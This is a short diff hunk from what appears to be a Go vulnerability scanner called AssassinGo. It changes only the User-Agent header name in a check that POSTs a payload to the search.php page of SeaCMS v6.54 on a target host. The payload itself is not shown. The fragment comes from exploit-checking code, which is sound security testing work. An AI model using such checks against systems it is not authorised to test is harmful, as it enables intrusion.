@@ -49,7 +49,7 @@ func (s *SeaCMSv654) check() {
 	req, _ := http.NewRequest("POST", "http://"+s.target+":8888/seacmsv6.54/upload/search.php"+cmd, strings.NewReader(payload.Encode()))
 
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	req.Header.Set("user-agent", "Mozilla/5.0 (compatible; AssassinGo/0.1)")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; AssassinGo/0.1)")
 	resp, err := client.Do(req)
 	if err != nil {
 		fmt.Println(err)
